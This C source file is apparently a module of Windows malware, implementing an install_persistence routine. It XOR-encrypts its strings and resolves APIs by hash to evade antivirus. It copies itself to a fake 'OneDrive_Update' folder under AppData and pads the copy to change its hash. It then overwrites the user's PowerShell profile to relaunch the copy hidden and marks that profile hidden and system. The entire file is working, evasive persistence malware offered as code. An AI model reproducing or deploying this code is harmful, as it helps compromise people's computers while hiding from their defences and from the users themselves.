#include "config.h"
#include "persistence.h"
#include "evasion.h"
#include <string.h>
#include <shlobj.h>
#include <stdio.h>

// --- typedefs for API Hashing

// for kernel32 APIs
typedef DWORD (WINAPI *pGetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
typedef BOOL (WINAPI *pCopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef BOOL (WINAPI *pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
typedef DWORD (WINAPI *pGetTickCount)(void);
typedef BOOL (WINAPI *pCreateDirectoryA)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
typedef BOOL (WINAPI *pSetFileAttributesA)(LPCSTR lpFileName, DWORD dwFileAttributes);

// for shell32 APIs
typedef HRESULT (WINAPI *pSHGetFolderPathA)(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);

bool install_persistence(const char* current_exe_path) {
    // load key runtime (in stack)
    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);

    char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
    // string: "APPDATA"
    char enc_AppData[] = { 0x1e, 0x23, 0x25, 0x34, 0x72, 0x27, 0x72, 0x63, 0x72 };
    // string: "\\OneDrive_Update"    
    char enc_FakeFolder[] = { 0x03, 0x3c, 0x1b, 0x15, 0x77, 0x01, 0x5a, 0x15, 0x17, 0x6c, 0x21, 0x1b, 0x57, 0x18, 0x2b, 0x3a, 0x73, 0x75 };
    // "string: "\\OneDriveUpdate.exe"
    char enc_DestFile[] = { 0x03, 0x3c, 0x1b, 0x15, 0x77, 0x01, 0x5a, 0x15, 0x17, 0x66, 0x04, 0x0f, 0x52, 0x0d, 0x3a, 0x71, 0x16, 0x0d, 0x15, 0x33 };
    char enc_shell32[] = { 0x2c, 0x1b, 0x10, 0x1c, 0x5f, 0x40, 0x01, 0x4d, 0x16, 0x5f, 0x18, 0x6b, 0x33 };
    // string: "\\WindowsPowerShell"
    char enc_psFolder[] = { 0x03, 0x24, 0x1c, 0x1e, 0x57, 0x1c, 0x44, 0x10, 0x22, 0x5c, 0x03, 0x0e, 0x41, 0x2a, 0x37, 0x3a, 0x1f, 0x19, 0x70, 0x33 };
    // string: "\\Microsoft.PowerShell_profile.ps1" 
    char enc_psFile[] = { 0x03, 0x3e, 0x1c, 0x13, 0x41, 0x1c, 0x40, 0x0c, 0x14, 0x47, 0x5a, 0x3b, 0x5c, 0x0e, 0x3a, 0x2d, 0x20, 0x1d, 0x15, 0x5f, 0x1f, 0x6c, 0x13, 0x00, 0x5c, 0x12, 0x02, 0x5f, 0x1c, 0x71, 0x2f, 0x00, 0x44, 0x70, 0x33 };
    // string: "Start-Process -FilePath \"%s\" -WindowStyle Hidden\n"
    char enc_psPayload[] = { 0x0c, 0x07, 0x14, 0x02, 0x47, 0x5e, 0x63, 0x11, 0x1d, 0x50, 0x11, 0x18, 0x40, 0x59, 0x72, 0x19, 0x1a, 0x19, 0x15, 0x63, 0x12, 0x47, 0x0b, 0x52, 0x11, 0x51, 0x18, 0x11, 0x59, 0x72, 0x08, 0x1a, 0x1b, 0x14, 0x5c, 0x04, 0x60, 0x17, 0x0b, 0x5f, 0x11, 0x4b, 0x7b, 0x10, 0x3b, 0x3b, 0x16, 0x1b, 0x2c, 0x5d, 0x73, 0x33 };

    // API hashes
    DWORD hash_GetEnvVarA = 0x87889701;         // djb2 for "GetEnvironmentVariableA"
    DWORD hash_CopyFileA = 0xAC2253C1;          // djb2 for "CopyFileA"
    DWORD hash_CreateFileA = 0xEB96C5FA;        // djb2 for "CreateFileA"
    DWORD hash_WriteFile = 0x663CECB0;          // djb2 for "WriteFile"
    DWORD hash_CloseHandle = 0x3870CA07;        // djb2 for "CloseHandle"
    DWORD hash_GetTickCount = 0x41AD16B9;       // djb2 for "GetTickCount"
    DWORD hash_CreateDirectoryA = 0x41FABFEF;   // djb2 for "CreateDirectoryA"
    DWORD hash_SetFileAttributesA = 0xF5A60659; // djb2 for "SetFileAttributesA"
    DWORD hash_SHGetFolderPathA = 0xA15CE62A;   // djb2 for "SHGetFolderPathA"

    // --- dynamic DLL load

    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);

    xor_crypt(enc_shell32, sizeof(enc_shell32), cypher_key, cypher_key_len); 
    HMODULE hShell32 = LoadLibraryA(enc_shell32);
    xor_crypt(enc_shell32, sizeof(enc_shell32), cypher_key, cypher_key_len);

    if (!hKernel32 || !hShell32) return false;

    // --- dynamic resolution via hashing
    
    pGetEnvironmentVariableA fnGetEnvVarA = (pGetEnvironmentVariableA) get_api_by_hash(hKernel32, hash_GetEnvVarA);
    pCopyFileA fnCopyFileA = (pCopyFileA) get_api_by_hash(hKernel32, hash_CopyFileA);
    pCreateFileA fnCreateFileA = (pCreateFileA) get_api_by_hash(hKernel32, hash_CreateFileA);
    pWriteFile fnWriteFile = (pWriteFile) get_api_by_hash(hKernel32, hash_WriteFile);
    pCloseHandle fnCloseHandle = (pCloseHandle) get_api_by_hash(hKernel32, hash_CloseHandle);
    pGetTickCount fnGetTickCount = (pGetTickCount) get_api_by_hash(hKernel32, hash_GetTickCount);
    pCreateDirectoryA fnCreateDirectoryA = (pCreateDirectoryA) get_api_by_hash(hKernel32, hash_CreateDirectoryA);
    pSetFileAttributesA fnSetFileAttributesA = (pSetFileAttributesA) get_api_by_hash(hKernel32, hash_SetFileAttributesA);
    pSHGetFolderPathA fnSHGetFolderPathA = (pSHGetFolderPathA) get_api_by_hash(hShell32, hash_SHGetFolderPathA);

    // if AV blocks a function -> return
    if (!fnGetEnvVarA || !fnCopyFileA || !fnCreateFileA || !fnWriteFile || !fnCloseHandle || !fnCreateDirectoryA || !fnSetFileAttributesA || !fnSHGetFolderPathA) { 
        #ifdef DEBUG
        printf("[-] Error: One or more API hash failed to resolve.\n");
        #endif
        return false;
    }

    // --- self-copy logic

    char dest_path[MAX_PATH];
    memset(dest_path, 0, MAX_PATH);

    // decrypt APPDATA string
    xor_crypt(enc_AppData, sizeof(enc_AppData), cypher_key, cypher_key_len);
    DWORD env_res = fnGetEnvVarA(enc_AppData, dest_path, MAX_PATH);
    xor_crypt(enc_AppData, sizeof(enc_AppData), cypher_key, cypher_key_len);

    if (env_res > 0 && env_res < MAX_PATH) {
        // append fake folder name and create directory
        xor_crypt(enc_FakeFolder, sizeof(enc_FakeFolder), cypher_key, cypher_key_len);
        strcat(dest_path, enc_FakeFolder);
        xor_crypt(enc_FakeFolder, sizeof(enc_FakeFolder), cypher_key, cypher_key_len);
        
        fnCreateDirectoryA(dest_path, NULL);

        xor_crypt(enc_DestFile, sizeof(enc_DestFile), cypher_key, cypher_key_len);
        // append filename to APPDATA path
        strcat(dest_path, enc_DestFile);
        #ifdef DEBUG
        printf("[!] Using destination path: %s.\n", dest_path);
        #endif
        xor_crypt(enc_DestFile, sizeof(enc_DestFile), cypher_key, cypher_key_len);

        fnCopyFileA(current_exe_path, dest_path, FALSE);

        // --- hash mutation (overlay padding)

        HANDLE hFile = fnCreateFileA(dest_path, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            // generate pseudo-random bytes based on system uptime
            DWORD junk_data = fnGetTickCount(); 
            DWORD bytes_written = 0;

            // write 4 bytes to the end of the exe
            fnWriteFile(hFile, &junk_data, sizeof(junk_data), &bytes_written, NULL);
            fnCloseHandle(hFile);
        }
    } else {
        strcpy(dest_path, current_exe_path);
    }

    // --- PowerShell profile logic

    char docs_folder[MAX_PATH];
    
    // CSIDL_PERSONAL (0x0005) -> \Users\Username\Documents
    if (SUCCEEDED(fnSHGetFolderPathA(NULL, 0x0005, NULL, 0, docs_folder))) {
        
        // append \WindowsPowerShell
        xor_crypt(enc_psFolder, sizeof(enc_psFolder), cypher_key, cypher_key_len);
        strcat(docs_folder, enc_psFolder);
        #ifdef DEBUG
        printf("[!] Using Documents path: %s.\n", docs_folder);
        #endif
        xor_crypt(enc_psFolder, sizeof(enc_psFolder), cypher_key, cypher_key_len);
        
        // create directory (fails silently if it already exists)
        fnCreateDirectoryA(docs_folder, NULL);
        
        // append \Microsoft.PowerShell_profile.ps1
        xor_crypt(enc_psFile, sizeof(enc_psFile), cypher_key, cypher_key_len); 
        strcat(docs_folder, enc_psFile);
        xor_crypt(enc_psFile, sizeof(enc_psFile), cypher_key, cypher_key_len); 

        // decrypt payload string
        xor_crypt(enc_psPayload, sizeof(enc_psPayload), cypher_key, cypher_key_len);

        // format payload string
        char ps_payload[MAX_PATH * 2];
        snprintf(ps_payload, sizeof(ps_payload), enc_psPayload, dest_path);
        #ifdef DEBUG
        printf("[!] Using execution string: %s.\n", ps_payload);
        #endif
        // OPSEC: recypher immediately
        xor_crypt(enc_psPayload, sizeof(enc_psPayload), cypher_key, cypher_key_len);

        // write the file
        HANDLE hPsFile = fnCreateFileA(docs_folder, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hPsFile != INVALID_HANDLE_VALUE) {
            DWORD bytes_written = 0;
            fnWriteFile(hPsFile, ps_payload, strlen(ps_payload), &bytes_written, NULL);
            fnCloseHandle(hPsFile);

            // OPSEC: make the profile hidden
            fnSetFileAttributesA(docs_folder, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

            #ifdef DEBUG
            printf("[+] Persistence via PowerShell Profile installed successfully.\n");
            #endif

            return true;
        }
    }
    
    return false;
}